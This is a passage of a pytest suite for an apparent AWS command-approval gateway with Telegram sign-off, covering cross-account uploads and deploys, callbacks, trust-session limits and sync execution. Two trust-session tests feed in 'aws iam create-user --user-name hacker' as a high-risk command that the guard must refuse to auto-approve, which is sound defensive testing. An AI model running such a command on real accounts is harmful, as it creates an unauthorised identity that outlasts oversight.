    def test_add_account_missing_name(self, mock_telegram, app_module):
        """新增帳號缺少名稱"""
        result = app_module.mcp_tool_add_account('test-1', {
            'account_id': '123456789012'
        })
        body = json.loads(result['body'])
        # 應該有錯誤或使用預設名稱
        assert 'result' in body or 'error' in body


class TestHelpCommand:
    """bouncer_help 測試"""

    def test_help_ec2_describe(self):
        """測試 EC2 describe 命令說明"""
        from src.help_command import get_command_help

        result = get_command_help('aws ec2 describe-instances')
        assert 'error' not in result
        assert result['service'] == 'ec2'
        assert result['operation'] == 'describe-instances'
        assert 'parameters' in result
        assert 'instance-ids' in result['parameters']

    def test_help_invalid_command(self):
        """測試無效命令"""
        from src.help_command import get_command_help

        result = get_command_help('aws ec2 invalid-command')
        assert 'error' in result
        assert 'similar_operations' in result

    def test_help_service_operations(self):
        """測試列出服務操作"""
        from src.help_command import get_service_operations

        result = get_service_operations('s3')
        assert 'error' not in result
        assert result['service'] == 's3'
        assert len(result['operations']) > 0

    def test_help_format_text(self):
        """測試格式化輸出"""
        from src.help_command import get_command_help, format_help_text

        result = get_command_help('aws s3 ls')
        # s3 ls 可能沒有 input shape，測試不會報錯
        formatted = format_help_text(result)
        assert isinstance(formatted, str)

    def test_mcp_tool_help(self, mock_dynamodb):
        """測試 MCP tool 呼叫"""
        from src.mcp_tools import mcp_tool_help
        import json

        result = mcp_tool_help('test-req', {'command': 'ec2 describe-instances'})
        # mcp_tool_help 返回 Lambda response 格式
        assert 'body' in result
        body = json.loads(result['body'])
        content = body['result']['content'][0]['text']
        data = json.loads(content)
        assert data['service'] == 'ec2'


# ============================================================================
# Cross-Account Upload Tests
# ============================================================================

class TestCrossAccountUpload:
    """Upload 跨帳號功能測試"""

    @pytest.fixture(autouse=True)
    def setup_default_account(self, monkeypatch, app_module):
        """設定預設帳號 ID for upload tests"""
        import mcp_tools
        import mcp_upload
        monkeypatch.setattr(mcp_upload, 'DEFAULT_ACCOUNT_ID', '111111111111')

    @pytest.fixture(autouse=True)
    def setup_accounts_table(self, mock_dynamodb, app_module):
        """建立 accounts 表"""
        import accounts
        accounts._accounts_table = None  # 重置快取
        try:
            mock_dynamodb.create_table(
                TableName='bouncer-accounts',
                KeySchema=[{'AttributeName': 'account_id', 'KeyType': 'HASH'}],
                AttributeDefinitions=[{'AttributeName': 'account_id', 'AttributeType': 'S'}],
                BillingMode='PAY_PER_REQUEST'
            )
        except Exception:
            pass  # 表可能已存在

    @patch('mcp_upload.send_telegram_message')
    def test_upload_default_account_no_assume_role(self, mock_telegram, app_module):
        """不帶 account 參數 → 使用預設帳號，不 assume role"""
        import base64
        content = base64.b64encode(b'test content').decode()

        result = app_module.mcp_tool_upload('test-1', {
            'filename': 'test.txt',
            'content': content,
            'reason': 'test upload',
            'source': 'test-bot'
        })

        body = json.loads(result['body'])
        resp = json.loads(body['result']['content'][0]['text'])
        assert resp['status'] == 'pending_approval'
        assert 'bouncer-uploads-111111111111' in resp['s3_uri']

        # 檢查 DynamoDB item 沒有 assume_role
        table = app_module.table
        items = table.scan()['Items']
        upload_item = [i for i in items if i.get('action') == 'upload'][-1]
        assert 'assume_role' not in upload_item
        assert upload_item['account_id'] == '111111111111'
        assert upload_item['account_name'] == 'Default'

    @patch('mcp_upload.send_telegram_message')
    def test_upload_cross_account_with_role(self, mock_telegram, app_module):
        """帶 account 參數 → 使用跨帳號，存 assume_role"""
        import base64
        content = base64.b64encode(b'cross account test').decode()

        # 先新增帳號
        from accounts import _get_accounts_table
        _get_accounts_table().put_item(Item={
            'account_id': '222222222222',
            'name': 'Dev',
            'role_arn': 'arn:aws:iam::222222222222:role/BouncerRole',
            'enabled': True,
            'created_at': 1000
        })

        result = app_module.mcp_tool_upload('test-1', {
            'filename': 'template.yaml',
            'content': content,
            'reason': 'deploy test',
            'source': 'test-bot',
            'account': '222222222222'
        })

        body = json.loads(result['body'])
        resp = json.loads(body['result']['content'][0]['text'])
        assert resp['status'] == 'pending_approval'
        assert 'bouncer-uploads-222222222222' in resp['s3_uri']

        # 檢查 DynamoDB item 有 assume_role
        table = app_module.table
        items = table.scan()['Items']
        upload_item = [i for i in items if i.get('action') == 'upload' and i.get('account_id') == '222222222222'][-1]
        assert upload_item['assume_role'] == 'arn:aws:iam::222222222222:role/BouncerRole'
        assert upload_item['account_name'] == 'Dev'
        assert upload_item['bucket'] == 'bouncer-uploads-222222222222'

    @patch('mcp_upload.send_telegram_message')
    def test_upload_invalid_account(self, mock_telegram, app_module):
        """帶不存在的 account → 錯誤"""
        import base64
        content = base64.b64encode(b'test').decode()

        result = app_module.mcp_tool_upload('test-1', {
            'filename': 'test.txt',
            'content': content,
            'reason': 'test',
            'source': 'test-bot',
            'account': '111111111111'
        })

        body = json.loads(result['body'])
        resp = json.loads(body['result']['content'][0]['text'])
        assert resp['status'] == 'error'
        assert '未配置' in resp['error']

    @patch('mcp_upload.send_telegram_message')
    def test_upload_disabled_account(self, mock_telegram, app_module):
        """帶停用的 account → 錯誤"""
        import base64
        content = base64.b64encode(b'test').decode()

        # 新增停用帳號
        from accounts import _get_accounts_table
        _get_accounts_table().put_item(Item={
            'account_id': '333333333333',
            'name': 'Disabled',
            'role_arn': 'arn:aws:iam::333333333333:role/BouncerRole',
            'enabled': False,
            'created_at': 1000
        })

        result = app_module.mcp_tool_upload('test-1', {
            'filename': 'test.txt',
            'content': content,
            'reason': 'test',
            'source': 'test-bot',
            'account': '333333333333'
        })

        body = json.loads(result['body'])
        resp = json.loads(body['result']['content'][0]['text'])
        assert resp['status'] == 'error'
        assert '已停用' in resp['error']

    @patch('mcp_upload.send_telegram_message')
    def test_upload_notification_includes_account(self, mock_telegram, app_module):
        """通知訊息包含帳號資訊"""
        import base64
        content = base64.b64encode(b'test').decode()

        result = app_module.mcp_tool_upload('test-1', {
            'filename': 'test.txt',
            'content': content,
            'reason': 'test',
            'source': 'test-bot'
        })

        # 檢查 Telegram 通知有帳號欄位
        mock_telegram.assert_called_once()
        msg = mock_telegram.call_args[0][0]
        assert '帳號' in msg
        assert '111111111111' in msg


# ============================================================================
# Cross-Account Upload Execution Tests
# ============================================================================

class TestCrossAccountUploadExecution:
    """Upload 跨帳號執行（審批後）測試"""

    def test_execute_upload_no_assume_role(self, app_module):
        """無 assume_role → 用 Lambda 自身權限上傳"""
        import base64

        # 建立 mock upload request
        request_id = 'test-upload-no-assume'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'action': 'upload',
            'bucket': 'bouncer-uploads-111111111111',
            'key': '2026-02-21/test/file.txt',
            'content': base64.b64encode(b'hello').decode(),
            'content_type': 'text/plain',
            'status': 'pending_approval'
        })

        with patch('boto3.client') as mock_boto:
            mock_s3 = MagicMock()
            mock_s3.meta.region_name = 'us-east-1'
            mock_boto.return_value = mock_s3

            result = app_module.execute_upload(request_id, 'test-approver')

            assert result['success'] is True
            # Should NOT have called sts assume_role
            mock_boto.assert_called_once_with('s3')
            mock_s3.put_object.assert_called_once()

    def test_execute_upload_with_assume_role(self, app_module):
        """有 assume_role → STS assume role 後上傳"""
        import base64

        request_id = 'test-upload-with-assume'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'action': 'upload',
            'bucket': 'bouncer-uploads-222222222222',
            'key': '2026-02-21/test/file.txt',
            'content': base64.b64encode(b'hello').decode(),
            'content_type': 'text/plain',
            'assume_role': 'arn:aws:iam::222222222222:role/BouncerRole',
            'status': 'pending_approval'
        })

        mock_sts = MagicMock()
        mock_sts.assume_role.return_value = {
            'Credentials': {
                'AccessKeyId': 'AKIATEST',
                'SecretAccessKey': 'secret',
                'SessionToken': 'token'
            }
        }
        mock_s3 = MagicMock()
        mock_s3.meta.region_name = 'us-east-1'

        def mock_client(service, **kwargs):
            if service == 'sts':
                return mock_sts
            return mock_s3

        with patch('boto3.client', side_effect=mock_client):
            result = app_module.execute_upload(request_id, 'test-approver')

            assert result['success'] is True
            mock_sts.assume_role.assert_called_once_with(
                RoleArn='arn:aws:iam::222222222222:role/BouncerRole',
                RoleSessionName='bouncer-upload'
            )
            mock_s3.put_object.assert_called_once()


# ============================================================================
# Cross-Account Upload Callback Tests
# ============================================================================

class TestCrossAccountUploadCallback:
    """Upload callback 帳號顯示測試"""

    @patch('callbacks.answer_callback')
    @patch('callbacks.update_message')
    def test_upload_callback_shows_account(self, mock_update, mock_answer, app_module):
        """上傳 callback 顯示帳號資訊"""
        import callbacks

        item = {
            'request_id': 'test-cb-account',
            'action': 'upload',
            'bucket': 'bouncer-uploads-222222222222',
            'key': '2026-02-21/test/file.txt',
            'content': 'dGVzdA==',
            'content_type': 'text/plain',
            'content_size': 4,
            'source': 'test-bot',
            'reason': 'test',
            'account_id': '222222222222',
            'account_name': 'Dev',
            'assume_role': 'arn:aws:iam::222222222222:role/BouncerRole',
            'status': 'pending_approval'
        }

        # Mock execute_upload
        with patch.object(app_module, 'execute_upload', return_value={
            'success': True,
            's3_uri': 's3://bouncer-uploads-222222222222/2026-02-21/test/file.txt',
            's3_url': 'https://bouncer-uploads-222222222222.s3.amazonaws.com/2026-02-21/test/file.txt'
        }):
            callbacks.handle_upload_callback('approve', 'test-cb-account', item, 123, 'cb-1', 'user-1')

        # 確認通知包含帳號
        msg = mock_update.call_args[0][1]
        assert '222222222222' in msg
        assert 'Dev' in msg

    @patch('callbacks.answer_callback')
    @patch('callbacks.update_message')
    def test_upload_callback_no_account_backward_compat(self, mock_update, mock_answer, app_module):
        """舊的 upload item（無 account_id）→ 不顯示帳號行"""
        import callbacks

        item = {
            'request_id': 'test-cb-no-account',
            'action': 'upload',
            'bucket': 'bouncer-uploads-111111111111',
            'key': '2026-02-21/test/file.txt',
            'content': 'dGVzdA==',
            'content_type': 'text/plain',
            'content_size': 4,
            'source': 'test-bot',
            'reason': 'test',
            'status': 'pending_approval'
        }

        with patch.object(app_module, 'execute_upload', return_value={
            'success': True,
            's3_uri': 's3://bouncer-uploads-111111111111/2026-02-21/test/file.txt',
            's3_url': 'https://bouncer-uploads-111111111111.s3.amazonaws.com/2026-02-21/test/file.txt'
        }):
            callbacks.handle_upload_callback('approve', 'test-cb-no-account', item, 123, 'cb-1', 'user-1')

        msg = mock_update.call_args[0][1]
        assert '帳號' not in msg


# ============================================================================
# Cross-Account Deploy Tests
# ============================================================================

class TestCrossAccountDeploy:
    """Deploy 跨帳號功能測試"""

    @pytest.fixture(autouse=True)
    def setup_deployer_tables(self, mock_dynamodb):
        """建立 deployer 相關表"""
        for tbl_name, key in [
            ('bouncer-projects', 'project_id'),
            ('bouncer-deploy-locks', 'project_id'),
        ]:
            try:
                mock_dynamodb.create_table(
                    TableName=tbl_name,
                    KeySchema=[{'AttributeName': key, 'KeyType': 'HASH'}],
                    AttributeDefinitions=[{'AttributeName': key, 'AttributeType': 'S'}],
                    BillingMode='PAY_PER_REQUEST'
                )
            except Exception:
                pass
        try:
            mock_dynamodb.create_table(
                TableName='bouncer-deploy-history',
                KeySchema=[{'AttributeName': 'deploy_id', 'KeyType': 'HASH'}],
                AttributeDefinitions=[
                    {'AttributeName': 'deploy_id', 'AttributeType': 'S'},
                    {'AttributeName': 'project_id', 'AttributeType': 'S'},
                    {'AttributeName': 'started_at', 'AttributeType': 'N'}
                ],
                GlobalSecondaryIndexes=[{
                    'IndexName': 'project-time-index',
                    'KeySchema': [
                        {'AttributeName': 'project_id', 'KeyType': 'HASH'},
                        {'AttributeName': 'started_at', 'KeyType': 'RANGE'}
                    ],
                    'Projection': {'ProjectionType': 'ALL'}
                }],
                BillingMode='PAY_PER_REQUEST'
            )
        except Exception:
            pass

    def test_add_project_stores_target_role_arn(self, app_module):
        """add_project 正確存 target_role_arn"""
        from deployer import add_project, get_project

        add_project('test-cross-deploy', {
            'name': 'Test Project',
            'git_repo': 'owner/repo',
            'stack_name': 'test-stack',
            'target_account': 'Dev (222222222222)',
            'target_role_arn': 'arn:aws:iam::222222222222:role/BouncerRole'
        })

        project = get_project('test-cross-deploy')
        assert project is not None
        assert project['target_role_arn'] == 'arn:aws:iam::222222222222:role/BouncerRole'
        assert project['target_account'] == 'Dev (222222222222)'

    def test_add_project_without_target_role_arn(self, app_module):
        """add_project 不帶 target_role_arn → 空字串"""
        from deployer import add_project, get_project

        add_project('test-local-deploy', {
            'name': 'Local Project',
            'git_repo': 'owner/repo',
            'stack_name': 'local-stack'
        })

        project = get_project('test-local-deploy')
        assert project is not None
        assert project['target_role_arn'] == ''

    @patch('deployer.sfn_client')
    def test_start_deploy_passes_target_role_arn(self, mock_sfn, app_module):
        """start_deploy 傳入 target_role_arn 到 Step Functions"""
        from deployer import add_project, start_deploy

        mock_sfn.start_execution.return_value = {
            'executionArn': 'arn:aws:states:us-east-1:111111111111:execution:test:deploy-test'
        }

        add_project('test-cross-sfn', {
            'name': 'Cross Account',
            'git_repo': 'owner/repo',
            'stack_name': 'cross-stack',
            'target_role_arn': 'arn:aws:iam::222222222222:role/BouncerRole'
        })

        result = start_deploy('test-cross-sfn', 'main', 'test-user', 'test deploy')
        assert result['status'] == 'started'

        # 檢查 SFN input 包含 target_role_arn
        call_args = mock_sfn.start_execution.call_args
        sfn_input = json.loads(call_args[1]['input'] if 'input' in call_args[1] else call_args.kwargs['input'])
        assert sfn_input['target_role_arn'] == 'arn:aws:iam::222222222222:role/BouncerRole'

    @patch('deployer.sfn_client')
    def test_start_deploy_empty_target_role_arn(self, mock_sfn, app_module):
        """start_deploy 無 target_role_arn → 空字串"""
        from deployer import add_project, start_deploy

        mock_sfn.start_execution.return_value = {
            'executionArn': 'arn:aws:states:us-east-1:111111111111:execution:test:deploy-local'
        }

        add_project('test-local-sfn', {
            'name': 'Local',
            'git_repo': 'owner/repo',
            'stack_name': 'local-stack'
        })

        result = start_deploy('test-local-sfn', 'main', 'test-user', 'local deploy')
        assert result['status'] == 'started'

        call_args = mock_sfn.start_execution.call_args
        sfn_input = json.loads(call_args[1]['input'] if 'input' in call_args[1] else call_args.kwargs['input'])
        assert sfn_input['target_role_arn'] == ''


# ============================================================================
# Deploy Notification Fallback Tests
# ============================================================================

class TestDeployNotificationFallback:
    """Deploy 通知帳號 fallback 測試"""

    @pytest.fixture(autouse=True)
    def setup_deployer_tables(self, mock_dynamodb):
        """建立 deployer 相關表"""
        for tbl_name, key in [
            ('bouncer-projects', 'project_id'),
            ('bouncer-deploy-locks', 'project_id'),
        ]:
            try:
                mock_dynamodb.create_table(
                    TableName=tbl_name,
                    KeySchema=[{'AttributeName': key, 'KeyType': 'HASH'}],
                    AttributeDefinitions=[{'AttributeName': key, 'AttributeType': 'S'}],
                    BillingMode='PAY_PER_REQUEST'
                )
            except Exception:
                pass
        try:
            mock_dynamodb.create_table(
                TableName='bouncer-deploy-history',
                KeySchema=[{'AttributeName': 'deploy_id', 'KeyType': 'HASH'}],
                AttributeDefinitions=[
                    {'AttributeName': 'deploy_id', 'AttributeType': 'S'},
                    {'AttributeName': 'project_id', 'AttributeType': 'S'},
                    {'AttributeName': 'started_at', 'AttributeType': 'N'}
                ],
                GlobalSecondaryIndexes=[{
                    'IndexName': 'project-time-index',
                    'KeySchema': [
                        {'AttributeName': 'project_id', 'KeyType': 'HASH'},
                        {'AttributeName': 'started_at', 'KeyType': 'RANGE'}
                    ],
                    'Projection': {'ProjectionType': 'ALL'}
                }],
                BillingMode='PAY_PER_REQUEST'
            )
        except Exception:
            pass

    def test_notification_fallback_from_role_arn(self, app_module):
        """target_account 空，從 target_role_arn 解析帳號 ID 顯示在通知中"""
        from deployer import send_deploy_approval_request
        import urllib.request

        project = {
            'project_id': 'test-fallback',
            'name': 'Fallback Test',
            'stack_name': 'fallback-stack',
            'target_role_arn': 'arn:aws:iam::222222222222:role/BouncerRole',
            # 注意：沒有 target_account
        }

        with patch('urllib.request.urlopen') as mock_urlopen:
            mock_resp = MagicMock()
            mock_resp.read.return_value = b'{"ok":true,"result":{"message_id":1}}'
            mock_urlopen.return_value = mock_resp

            send_deploy_approval_request('deploy-test-123', project, 'main', 'test', 'test-bot')

            # 檢查發送的訊息包含解析出的帳號
            call_args = mock_urlopen.call_args
            request_obj = call_args[0][0]
            body = request_obj.data.decode('utf-8')
            import urllib.parse
            params = urllib.parse.parse_qs(body)
            text = params['text'][0]
            assert '222222222222' in text
            assert '帳號' in text

    def test_notification_no_fallback_when_target_account_set(self, app_module):
        """target_account 有值，直接用不需要 fallback"""
        from deployer import send_deploy_approval_request

        project = {
            'project_id': 'test-no-fallback',
            'name': 'No Fallback',
            'stack_name': 'test-stack',
            'target_account': 'Dev (222222222222)',
            'target_role_arn': 'arn:aws:iam::222222222222:role/BouncerRole',
        }

        with patch('urllib.request.urlopen') as mock_urlopen:
            mock_resp = MagicMock()
            mock_resp.read.return_value = b'{"ok":true,"result":{"message_id":1}}'
            mock_urlopen.return_value = mock_resp

            send_deploy_approval_request('deploy-test-456', project, 'main', 'test', 'test-bot')

            call_args = mock_urlopen.call_args
            request_obj = call_args[0][0]
            body = request_obj.data.decode('utf-8')
            import urllib.parse
            params = urllib.parse.parse_qs(body)
            text = params['text'][0]
            assert 'Dev (222222222222)' in text

    def test_notification_no_account_at_all(self, app_module):
        """target_account 和 target_role_arn 都空 → 不顯示帳號行"""
        from deployer import send_deploy_approval_request

        project = {
            'project_id': 'test-no-account',
            'name': 'No Account',
            'stack_name': 'local-stack',
        }

        with patch('urllib.request.urlopen') as mock_urlopen:
            mock_resp = MagicMock()
            mock_resp.read.return_value = b'{"ok":true,"result":{"message_id":1}}'
            mock_urlopen.return_value = mock_resp

            send_deploy_approval_request('deploy-test-789', project, 'main', 'test', 'test-bot')

            call_args = mock_urlopen.call_args
            request_obj = call_args[0][0]
            body = request_obj.data.decode('utf-8')
            import urllib.parse
            params = urllib.parse.parse_qs(body)
            text = params['text'][0]
            assert '帳號' not in text


# ============================================================================
# Upload Deny Callback Account Display Test
# ============================================================================

class TestUploadDenyCallbackAccount:
    """Upload deny callback 帳號顯示測試"""

    @patch('callbacks.answer_callback')
    @patch('callbacks.update_message')
    def test_upload_deny_callback_shows_account(self, mock_update, mock_answer, app_module):
        """拒絕上傳的 callback 也顯示帳號資訊"""
        import callbacks

        item = {
            'request_id': 'test-deny-account',
            'action': 'upload',
            'bucket': 'bouncer-uploads-222222222222',
            'key': '2026-02-21/test/file.txt',
            'content_size': 4,
            'source': 'test-bot',
            'reason': 'test',
            'account_id': '222222222222',
            'account_name': 'Dev',
            'status': 'pending_approval'
        }

        callbacks.handle_upload_callback('deny', 'test-deny-account', item, 123, 'cb-1', 'user-1')

        msg = mock_update.call_args[0][1]
        assert '222222222222' in msg
        assert 'Dev' in msg
        assert '拒絕' in msg

    @patch('callbacks.answer_callback')
    @patch('callbacks.update_message')
    def test_upload_deny_callback_no_account(self, mock_update, mock_answer, app_module):
        """舊的 upload deny item（無 account_id）→ 不顯示帳號行"""
        import callbacks

        item = {
            'request_id': 'test-deny-no-account',
            'action': 'upload',
            'bucket': 'bouncer-uploads-111111111111',
            'key': '2026-02-21/test/file.txt',
            'content_size': 4,
            'source': 'test-bot',
            'reason': 'test',
            'status': 'pending_approval'
        }

        callbacks.handle_upload_callback('deny', 'test-deny-no-account', item, 123, 'cb-1', 'user-1')

        msg = mock_update.call_args[0][1]
        assert '帳號' not in msg
        assert '拒絕' in msg


# ============================================================================
# Trust Session Limits Tests
# ============================================================================

class TestTrustSessionLimits:
    """測試信任時段的邊界條件"""

    def test_trust_session_expired(self, app_module):
        """信任時段已過期 → should_trust_approve 返回 False"""
        from trust import should_trust_approve

        # 建立已過期的信任時段
        app_module.table.put_item(Item={
            'request_id': 'trust-0d41c6bf4532be5b-111111111111',
            'type': 'trust_session',
            'source': 'test-source-expired',
            'trust_scope': 'test-source-expired',
            'account_id': '111111111111',
            'approved_by': '999999999',
            'created_at': int(time.time()) - 700,
            'expires_at': int(time.time()) - 100,  # 已過期
            'command_count': 0,
        })

        should, session, reason = should_trust_approve(
            'aws ec2 describe-instances', 'test-source-expired', '111111111111'
        )
        assert should is False
        assert 'expired' in reason.lower() or 'No active' in reason

    def test_trust_session_command_limit_reached(self, app_module):
        """命令數達上限 → should_trust_approve 返回 False"""
        from trust import should_trust_approve
        from constants import TRUST_SESSION_MAX_COMMANDS

        # 建立已達上限的信任時段
        app_module.table.put_item(Item={
            'request_id': 'trust-efb587eb4f037ac7-111111111111',
            'type': 'trust_session',
            'source': 'test-source-maxed',
            'trust_scope': 'test-source-maxed',
            'account_id': '111111111111',
            'approved_by': '999999999',
            'created_at': int(time.time()),
            'expires_at': int(time.time()) + 600,
            'command_count': TRUST_SESSION_MAX_COMMANDS,  # 已達上限
        })

        should, session, reason = should_trust_approve(
            'aws ec2 describe-instances', 'test-source-maxed', '111111111111'
        )
        assert should is False
        assert 'limit' in reason.lower()

    def test_trust_session_excluded_high_risk(self, app_module):
        """高危命令排除 → 即使在信任中也返回 False"""
        from trust import should_trust_approve

        # 建立有效的信任時段
        app_module.table.put_item(Item={
            'request_id': 'trust-042fefdf8d5cf4b5-111111111111',
            'type': 'trust_session',
            'source': 'test-source-excluded',
            'trust_scope': 'test-source-excluded',
            'account_id': '111111111111',
            'approved_by': '999999999',
            'created_at': int(time.time()),
            'expires_at': int(time.time()) + 600,
            'command_count': 0,
        })

        # IAM 操作即使在信任中也應被排除
        should, session, reason = should_trust_approve(
            'aws iam create-user --user-name hacker', 'test-source-excluded', '111111111111'
        )
        assert should is False
        assert 'excluded' in reason.lower() or 'trust' in reason.lower()


# ============================================================================
# Sync Mode Execute Tests
# ============================================================================

class TestSyncModeExecute:
    """測試同步/異步模式"""

    @patch('mcp_execute.execute_command')
    def test_sync_safe_command_auto_approved(self, mock_execute, app_module):
        """sync=True + safe command → 直接返回結果"""
        mock_execute.return_value = '{"Instances": []}'

        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 100,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws ec2 describe-instances',
                        'trust_scope': 'test-session',
                        'reason': 'sync test',
                        'sync': True
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }

        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'auto_approved'
        assert '{"Instances": []}' in content['result']

    @patch('telegram.send_telegram_message')
    def test_async_default_pending(self, mock_telegram, app_module):
        """async 預設 → 立即返回 pending_approval"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 101,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws ec2 start-instances --instance-ids i-123',
                        'trust_scope': 'test-session',
                        'reason': 'async test'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }

        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'pending_approval'
        assert 'request_id' in content


# ============================================================================
# Cross-Account Execute Flow Tests
# ============================================================================

class TestCrossAccountExecuteFlow:
    """測試跨帳號執行流程"""

    @pytest.fixture(autouse=True)
    def setup_accounts_table(self, mock_dynamodb, app_module):
        """建立 accounts 表"""
        import accounts
        accounts._accounts_table = None  # 重置快取
        try:
            mock_dynamodb.create_table(
                TableName='bouncer-accounts',
                KeySchema=[{'AttributeName': 'account_id', 'KeyType': 'HASH'}],
                AttributeDefinitions=[{'AttributeName': 'account_id', 'AttributeType': 'S'}],
                BillingMode='PAY_PER_REQUEST'
            )
        except Exception:
            pass  # 表可能已存在

    @patch('mcp_execute.execute_command')
    @patch('telegram.send_telegram_message')
    def test_cross_account_with_assume_role(self, mock_telegram, mock_execute, app_module):
        """mock execute_command 驗證帶 assume_role 的調用"""
        mock_execute.return_value = '{"Account": "992382394211"}'

        # 先在 accounts table 加入帳號
        from accounts import _get_accounts_table
        accounts_table = _get_accounts_table()
        accounts_table.put_item(Item={
            'account_id': '992382394211',
            'name': 'Dev',
            'role_arn': 'arn:aws:iam::992382394211:role/BouncerExecutionRole',
            'enabled': True,
        })

        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 200,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws sts get-caller-identity',
                        'trust_scope': 'test-session',
                        'account': '992382394211',
                        'reason': 'cross-account test'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }

        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'auto_approved'
        # 驗證 execute_command 被呼叫時帶了 assume_role
        mock_execute.assert_called_once()
        call_args = mock_execute.call_args
        assert call_args[0][0] == 'aws sts get-caller-identity'
        assert 'BouncerExecutionRole' in (call_args[0][1] or '')

    def test_account_not_found_returns_available(self, app_module):
        """帳號不存在 → 返回可用帳號列表"""
        # 初始化預設帳號，這樣才有可用帳號列表
        from accounts import init_default_account
        init_default_account()

        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 201,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws s3 ls',
                        'trust_scope': 'test-session',
                        'account': '999999999999',
                        'reason': 'test unknown account'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }

        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert '999999999999' in content['error']

    @patch('mcp_execute.execute_command')
    def test_assume_role_failure(self, mock_execute, app_module):
        """assume_role 失敗 → 返回錯誤"""
        mock_execute.return_value = '❌ Assume role 失敗: Access Denied'

        # 建立帳號配置
        from accounts import _get_accounts_table
        accounts_table = _get_accounts_table()
        accounts_table.put_item(Item={
            'account_id': '888888888888',
            'name': 'Broken',
            'role_arn': 'arn:aws:iam::888888888888:role/BrokenRole',
            'enabled': True,
        })

        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 202,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws sts get-caller-identity',
                        'trust_scope': 'test-session',
                        'account': '888888888888',
                        'reason': 'test broken role'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }

        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'auto_approved'
        assert 'Assume role 失敗' in content['result']


# ============================================================
# Phase 2 Audit Fix: Additional Test Coverage
# ============================================================

class TestTrustSessionExpiry:
    """Trust session expiry and limits (T-4)."""

    @pytest.fixture(autouse=True)
    def setup(self, app_module):
        self.app = app_module
        import trust as trust_mod
        self.trust = trust_mod
        # Reset trust module table reference
        trust_mod._table = None

    def test_expired_trust_session_not_approved(self, app_module):
        """Expired trust session should NOT auto-approve."""
        # Create an already-expired trust session
        table = app_module.table
        table.put_item(Item={
            'request_id': 'trust-37b1ddd649ff2758-111111111111',
            'type': 'trust_session',
            'source': 'expire-test',
            'trust_scope': 'expire-test',
            'account_id': '111111111111',
            'approved_by': '999999999',
            'created_at': int(time.time()) - 700,
            'expires_at': int(time.time()) - 10,
            'command_count': 0,
            'ttl': int(time.time()) + 3600,
        })
        should, session, reason = self.trust.should_trust_approve(
            'aws s3 ls', 'expire-test', '111111111111'
        )
        assert should is False

    def test_max_commands_trust_session_not_approved(self, app_module):
        """Trust session at max commands should NOT auto-approve."""
        from constants import TRUST_SESSION_MAX_COMMANDS
        table = app_module.table
        table.put_item(Item={
            'request_id': 'trust-18bb6f0eae17a70a-111111111111',
            'type': 'trust_session',
            'source': 'maxcmd-test',
            'trust_scope': 'maxcmd-test',
            'account_id': '111111111111',
            'approved_by': '999999999',
            'created_at': int(time.time()),
            'expires_at': int(time.time()) + 600,
            'command_count': TRUST_SESSION_MAX_COMMANDS,
            'ttl': int(time.time()) + 3600,
        })
        should, session, reason = self.trust.should_trust_approve(
            'aws s3 ls', 'maxcmd-test', '111111111111'
        )
        assert should is False
        assert 'limit' in reason.lower()

    def test_excluded_command_not_trusted(self, app_module):
        """High-risk commands should NOT be trusted even in active session."""
        table = app_module.table
        table.put_item(Item={
            'request_id': 'trust-cc46a32017401146-111111111111',
            'type': 'trust_session',
            'source': 'exclude-test',
            'trust_scope': 'exclude-test',
            'account_id': '111111111111',
            'approved_by': '999999999',
            'created_at': int(time.time()),
            'expires_at': int(time.time()) + 600,
            'command_count': 0,
            'ttl': int(time.time()) + 3600,
        })
        should, session, reason = self.trust.should_trust_approve(
            'aws iam create-user --user-name hacker', 'exclude-test', '111111111111'
        )
        assert should is False

    def test_valid_trust_session_approved(self, app_module):
        """Valid trust session with safe command should auto-approve."""
        table = app_module.table
        table.put_item(Item={
            'request_id': 'trust-b52d169fa85badb4-111111111111',
            'type': 'trust_session',
            'source': 'valid-test',
            'trust_scope': 'valid-test',
            'account_id': '111111111111',
            'approved_by': '999999999',
            'created_at': int(time.time()),
            'expires_at': int(time.time()) + 600,
            'command_count': 0,
            'ttl': int(time.time()) + 3600,
        })
        should, session, reason = self.trust.should_trust_approve(
            'aws s3 cp file.txt s3://bucket/', 'valid-test', '111111111111'
        )
        assert should is True
        assert 'active' in reason.lower()


class TestSyncAsyncMode:
    """Sync vs async execution mode (T-5)."""

    @patch('mcp_tools.send_telegram_message')
